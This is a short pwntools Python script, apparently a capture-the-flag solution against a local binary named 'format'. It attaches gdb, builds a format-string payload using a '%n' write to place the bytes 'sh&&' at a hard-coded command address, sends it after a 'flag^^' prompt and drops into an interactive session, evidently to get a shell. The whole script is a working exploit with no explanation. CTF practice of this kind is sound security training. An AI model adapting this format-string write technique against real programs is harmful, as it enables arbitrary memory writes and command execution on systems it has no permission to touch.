#!/bin/python3
from pwn import *

p = process('./format')
context.terminal = ['alacritty', '-e']

gdb.attach(p, gdbscript='''

b*main+94
           c

           ''')
cmd_address = 0x404060

payload = F'%{0x26266873}c%11$n'.encode()
payload = payload.ljust(0x18, b'\x00')
payload += p64(cmd_address)
p.sendlineafter(b'flag^^', payload)


p.interactive()

